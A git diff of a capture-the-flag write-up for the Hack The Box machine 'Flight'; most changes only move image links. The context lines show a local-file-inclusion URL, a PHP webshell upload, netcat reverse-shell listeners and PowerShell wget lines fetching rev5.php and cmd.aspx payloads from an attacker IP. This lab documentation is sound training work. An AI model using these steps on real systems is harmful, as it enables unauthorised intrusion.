@@ -2,10 +2,10 @@
 
 # Intro
 
-![image.png](flight_image.png)
+![image.png](MediaFiles/flight_image.png)
 
-[[windows]] [[NotAssumedBreach]] [[WebApp]] [[PortForwarding]] [[Impersonation]] [[DCSync]] [[WinPEAS]]
-Tags: #windows #NotAssumedBreach #Webapp #portForward #Impersonation #DCSync #WinPEAS
+[[windows]] [[NotAssumedBreach]] [[webapp]] [[PortForwarding]] [[Impersonation]] [[DCSync]] [[WinPEAS]]
+Tags: #windows #NotAssumedBreach #WebApp #PortForwarding #Impersonation #DCSync #WinPEAS
 
 Tools used:
 
@@ -15,7 +15,7 @@ Tools used:
 - chisel (port forwarding)
 - winpeas (windows privesc)
 - Runas (User impersonation)
-- Rubeus (obtaining silver ticket)
+- Rubeus
 - secretsdump (DCSync)
 
 ---
@@ -97,7 +97,7 @@ no shares found
 
 This is the `home` page
 
-![image.png](flight_image1.png)
+![image.png](MediaFiles/flight_image1.png)
 
 By clicking on any button and page i see no results or redirects… thats strange
 
@@ -264,7 +264,7 @@ sudo sh -c "echo '10.129.148.8 school.flight.htb' >> /etc/hosts"
 
 And then navigate there on our browser:
 
-![image.png](flight_image2.png)
+![image.png](MediaFiles/flight_image2.png)
 
 Just like the homepage, nothing is clickable here and no redirects were found by pressing buttons/links.. hm how to move forward here?
 
@@ -284,7 +284,7 @@ It seems that this is an apache web server, version `2.4.52` and also i can see 
 
 The version can also be seen by `wappalyzer` :
 
-![image.png](flight_image3.png)
+![image.png](MediaFiles/flight_image3.png)
 
 Before we move on, lets enumerate this one for directories too like we did for `flight.htb` :
 
@@ -342,25 +342,25 @@ Okay, found some pages here, what does these tell us tho? lets ty navigating on 
 
 `index.php` : actually goes into the home page
 
-![image.png](flight_image4.png)
+![image.png](MediaFiles/flight_image4.png)
 
 `/images` shows the images and gifs of the page:
 
-![image.png](flight_image5.png)
+![image.png](MediaFiles/flight_image5.png)
 
 Now sth i did not notice earlier, there are buttons that appear only when i hover upon them:
 
 `Home` basically is the home page and does not redirect elsewhere: full url [`http://school.flight.htb/index.php?view=home.html`](http://school.flight.htb/index.php?view=home.html)
 
-![image.png](flight_image6.png)
+![image.png](MediaFiles/flight_image6.png)
 
 `About us` . full url: [`http://school.flight.htb/index.php?view=about.html`](http://school.flight.htb/index.php?view=about.html)
 
-![image.png](flight_image7.png)
+![image.png](MediaFiles/flight_image7.png)
 
 Interesting, this one goes on another page:
 
-![image.png](flight_image8.png)
+![image.png](MediaFiles/flight_image8.png)
 
 It mentions template, in the lower part of the page:
 
@@ -376,7 +376,7 @@ I dont know if this might be a hint, we will keep that in mind for later if need
 
 `Blog` , full url [`http://school.flight.htb/index.php?view=blog.html`](http://school.flight.htb/index.php?view=blog.html)
 
-![image.png](flight_image9.png)
+![image.png](MediaFiles/flight_image9.png)
 
 In this page no redirects where observed, nothing is clickable apart from the navigation bar (Home, About us, Blog)
 
@@ -415,7 +415,7 @@ http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
 
 Nice! this did not get blocked and we received the file’s contents:
 
-![image.png](flight_image10.png)
+![image.png](MediaFiles/flight_image10.png)
 
 I guess the previous relative paths got blocked because it has detected the `../` parts.
 
@@ -1032,7 +1032,7 @@ upload the php webshell using the “put” command on `flight.htb` or `school.f
 
 once prompted with command line while accessing the phpshell from browser, 
 
-![image.png](flight_image11.png)
+![image.png](MediaFiles/flight_image11.png)
 
 execute this
 
@@ -1050,7 +1050,7 @@ nc -lvnp 9001
 
 and got a shell as svc_apache
 
-![image.png](flight_image12.png)
+![image.png](MediaFiles/flight_image12.png)
 
 ### User privileges (svc_apache)
 
@@ -1228,13 +1228,13 @@ rlwrap nc -lvnp 4444
 
 ## Shell as C.Bum
 
-![image.png](flight_image13.png)
+![image.png](MediaFiles/flight_image13.png)
 
 successful! got user flag: `4b75d3d79195394f018dccff2ef81592`
 
 proof:
 
-![image.png](flight_image14.png)
+![image.png](MediaFiles/flight_image14.png)
 
 that was really tough.. lets move on to privesc
 
@@ -1292,7 +1292,7 @@ For some reason, even tho i run it on the shell, the results were printed on the
 
 From the very large output, nothing stood out more than the listening ports, thus i decided to focus there especially due to the fact that we earlier found indicators of the presence of an IIS server running, and one of those ports below could be used by that server.
 
-![image.png](flight_image15.png)
+![image.png](MediaFiles/flight_image15.png)
 
 ### Listening ports
 
@@ -1556,11 +1556,11 @@ chisel server -p 8000 --reverse
 
 The screenshot below shows that the port forwarding was successful:
 
-![image.png](flight_image16.png)
+![image.png](MediaFiles/flight_image16.png)
 
 Next visit [`http://127.0.0.1:8001`](http://127.0.0.1:8001/) , and there is the webpage:
 
-![image.png](flight_image17.png)
+![image.png](MediaFiles/flight_image17.png)
 
 ## Banner grabbing
 
@@ -1642,7 +1642,7 @@ This does contain the webpage content, so **whatever we upload on this directory
 
 Lets get back to the shell we had as `svc_apache`, since its an IIS server we wanna see which user has write permissions on the `development` directory, and **it seems that user C.Bum has write permissions**! (indicated by the W in parenthesis on the 2nd line below)
 
-![image.png](flight_image18.png)
+![image.png](MediaFiles/flight_image18.png)
 
 Next, what if we follow the same approach like we did for getting shell as svc_apache? 
 
@@ -1658,7 +1658,7 @@ powershell -c wget 10.10.14.180:800/rev5.php -outfile rev5.php
 
 hm tried to upload it but its not found when navigating to it:
 
-![image.png](flight_image19.png)
+![image.png](MediaFiles/flight_image19.png)
 
 Why didnt this work? Well i later discovered that **PHP is not native to IIS** and By default, IIS is set up to run **ASP.NET applications**.
 
@@ -1674,7 +1674,7 @@ powershell -c wget 10.10.14.180:800/cmd.aspx -outfile cmd.aspx
 
 this works! By default these values are filled, lets input the command we want:
 
-![image.png](flight_image20.png)
+![image.png](MediaFiles/flight_image20.png)
 
 I will use this command:
 
@@ -1706,7 +1706,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 
 → got shell
 
-![image.png](flight_image21.png)
+![image.png](MediaFiles/flight_image21.png)
 
 Great! we got shell, but as what user?? the user is `iis apppool` , what is this user? well obviously its related to the IIS server but lets find more.
 
@@ -1896,7 +1896,7 @@ So our ticket:
 
 Here is a graphical representation of what Rubeus did:
 
-![image.png](flight_image22.png)
+![image.png](MediaFiles/flight_image22.png)
 
 mermaid:
 
@@ -2010,7 +2010,7 @@ grabbed root flag: `be6ba64f9dd6f54a69284c332c492694`
 
 proof:
 
-![image.png](flight_image23.png)
+![image.png](MediaFiles/flight_image23.png)
 
 ---
 
@@ -2026,4 +2026,4 @@ What i also will remember from this one, is the enumeration for `virtual hosts`,
 
 To sum up, this machine almost had everything, and i will definetely revisit it often throughout my OSCP journey.
 
-![image.png](flight_image24.png)
+![image.png](MediaFiles/flight_image24.png)
